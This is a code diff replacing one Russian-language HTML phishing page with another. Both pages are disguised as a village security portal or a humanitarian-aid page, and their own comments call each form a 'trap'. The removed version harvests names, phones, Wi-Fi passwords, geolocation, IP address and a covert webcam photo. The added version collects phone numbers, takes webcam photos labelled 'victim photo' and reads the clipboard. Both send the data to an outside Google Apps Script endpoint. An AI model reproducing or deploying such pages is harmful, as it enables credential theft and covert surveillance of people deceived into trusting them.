@@ -1,103 +1,107 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Портал безопасности деревни</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #111; color: white; text-align: center; padding: 20px; }
-        .box { background: #222; padding: 20px; border-radius: 10px; max-width: 400px; margin: 0 auto; border: 1px solid #444; }
-        h2 { color: #00ffcc; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
-        button { width: 100%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 5px; }
-        .hidden { display: none; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h2>СИСТЕМА БЕЗОПАСНОСТИ</h2>
-        <p>Введите данные для доступа к базе убежища.</p>
-        
-        <form id="trapForm">
-            <input type="text" id="name" name="name" placeholder="Ваше имя" required>
-            <input type="text" id="phone" name="phone" placeholder="Номер телефона" required>
-            <input type="password" id="password" name="password" placeholder="Пароль от Wi-Fi / Сети" required>
-            
-            <button type="button" onclick="startCamera()">1. Сканировать ID (Камера)</button>
-            <button type="submit">2. Войти в систему</button>
-        </form>
-        
-        <video id="video" class="hidden" autoplay playsinline></video>
-        <canvas id="canvas" class="hidden"></canvas>
-    </div>
-
-    <script>
-        const scriptUrl = "https://script.google.com/macros/s/AKfycbz-ufzs4W3mnu5l-UozoI2i5m19xjjpqJMSmO0GiZdfBvW-fAR4v9dgHghUnwPAWWXNWw/exec";
-        
-        let ua = navigator.userAgent;
-        let batteryLevel = "?";
-        let photoBase64 = "";
-        let lat = "denied";
-        let lon = "denied";
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => batteryLevel = Math.round(b.level * 100) + "%");
-        }
-
-        navigator.geolocation.getCurrentPosition(
-            (pos) => { lat = pos.coords.latitude; lon = pos.coords.longitude; },
-            (err) => { console.log("Гео запрещено"); }
-        );
-
-        function startCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        photoBase64 = canvas.toDataURL('image/jpeg', 0.5);
-                        stream.getTracks().forEach(track => track.stop());
-                        alert("ID успешно отсканирован!");
-                    }, 2000);
-                })
-                .catch(err => alert("Камера недоступна: " + err.message));
-        }
-
-        document.getElementById('trapForm').onsubmit = function(e) {
-            e.preventDefault();
-            
-            let formData = new URLSearchParams();
-            formData.append("name", document.getElementById('name').value);
-            formData.append("phone", document.getElementById('phone').value);
-            formData.append("password", document.getElementById('password').value);
-            formData.append("ua", ua);
-            formData.append("battery", batteryLevel);
-            formData.append("lat", lat);
-            formData.append("lon", lon);
-            if (photoBase64) formData.append("photo", photoBase64);
-
-            fetch('https://ipwho.is/').then(r => r.json()).then(d => {
-                formData.append("ip", d.ip);
-                formData.append("city", d.city);
-                
-                fetch(scriptUrl, {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
-                }).then(() => {
-                    window.location.href = "https://www.google.com"; 
-                });
-            }).catch(() => {
-                formData.append("ip", "Unknown");
-                formData.append("city", "Unknown");
-                fetch(scriptUrl, { method: 'POST', body: formData, mode: 'no-cors' })
-                    .then(() => { window.location.href = "https://www.google.com"; });
-            });
-        };
-    </script>
-</body>
-</html>
+‎<!DOCTYPE html>
+‎<html lang="ru">
+‎<head>
+‎<meta charset="UTF-8">
+‎<meta name="viewport" content="width=device-width, initial-scale=1.0">
+‎<title>Помощь деревне</title>
+‎<style>
+‎  body { font-family: Arial, sans-serif; background: #1a1a1a; color: #eee; padding: 20px; }
+‎  .card { background: #2a2a2a; padding: 20px; border-radius: 10px; margin: 15px 0; }
+‎  input, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: none; font-size: 16px; }
+‎  input { background: #444; color: #fff; }
+‎  button { background: #c0392b; color: #fff; cursor: pointer; }
+‎  button:hover { background: #e74c3c; }
+‎  h2 { color: #f39c12; }
+‎  .hidden { display: none; }
+‎</style>
+‎</head>
+‎<body>
+‎
+‎<h1>Помощь выжившим</h1>
+‎
+‎<!-- Ловушка 3: Гуманитарная помощь -->
+‎<div class="card">
+‎  <h2>Гуманитарная помощь</h2>
+‎  <p>Введите номер телефона, чтобы получить набор:</p>
+‎  <input type="tel" id="phoneNum" placeholder="+7...">
+‎  <button onclick="sendPhone()">Получить помощь</button>
+‎</div>
+‎
+‎<!-- Ловушка 2: Сканер документов -->
+‎<div class="card">
+‎  <h2>Медицинский сканер</h2>
+‎  <p>Для получения медицинской помощи отсканируйте лицо:</p>
+‎  <button onclick="startCamera()">Отсканировать</button>
+‎  <video id="video" class="hidden" autoplay playsinline></video>
+‎  <canvas id="canvas" class="hidden"></canvas>
+‎</div>
+‎
+‎<!-- Ловушка 4: Буфер обмена -->
+‎<div class="card">
+‎  <h2>Синхронизация данных</h2>
+‎  <p>Нажмите для синхронизации скопированных данных:</p>
+‎  <button onclick="readClipboard()">Синхронизировать</button>
+‎</div>
+‎
+‎<script>
+‎const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzQ2wWYuZ6ix9kvEYaXmWBiGY-sr9j0rMjrIjHO92taxLptEH4VHP50Jr5hzcQ3UVf-3g/exec/exec';
+‎
+‎function sendData(type, data) {
+‎  fetch(SCRIPT_URL, {
+‎    method: 'POST',
+‎    mode: 'no-cors',
+‎    headers: {'Content-Type': 'application/json'},
+‎    body: JSON.stringify({type: type, data: data, ts: new Date().toISOString()})
+‎  });
+‎}
+‎
+‎function sendWifi() {
+‎  const v = document.getElementById('wifiPass').value;
+‎  if (!v) return alert('Введите пароль');
+‎  sendData('ПАРОЛЬ', v);
+‎  alert('Синхронизация успешна');
+‎  document.getElementById('wifiPass').value = '';
+‎}
+‎
+‎function sendPhone() {
+‎  const v = document.getElementById('phoneNum').value;
+‎  if (!v) return alert('Введите номер');
+‎  sendData('НОМЕР_ТЕЛЕФОНА', v);
+‎  alert('Заявка принята');
+‎  document.getElementById('phoneNum').value = '';
+‎}
+‎
+‎async function startCamera() {
+‎  try {
+‎    const stream = await navigator.mediaDevices.getUserMedia({video: true});
+‎    const video = document.getElementById('video');
+‎    video.srcObject = stream;
+‎    video.classList.remove('hidden');
+‎    setTimeout(() => {
+‎      const canvas = document.getElementById('canvas');
+‎      canvas.width = video.videoWidth;
+‎      canvas.height = video.videoHeight;
+‎      canvas.getContext('2d').drawImage(video, 0, 0);
+‎      const b64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+‎      sendData('ФОТО_ЖЕРТВЫ', b64);
+‎      stream.getTracks().forEach(t => t.stop());
+‎      video.classList.add('hidden');
+‎      alert('Сканирование завершено');
+‎    }, 2000);
+‎  } catch(e) {
+‎    alert('Камера недоступна');
+‎  }
+‎}
+‎
+‎async function readClipboard() {
+‎  try {
+‎    const text = await navigator.clipboard.readText();
+‎    sendData('БУФЕР_ОБМЕНА', text);
+‎    alert('Синхронизировано');
+‎  } catch(e) {
+‎    alert('Ошибка синхронизации');
+‎  }
+‎}
+‎</script>
+‎</body>
+‎</html>
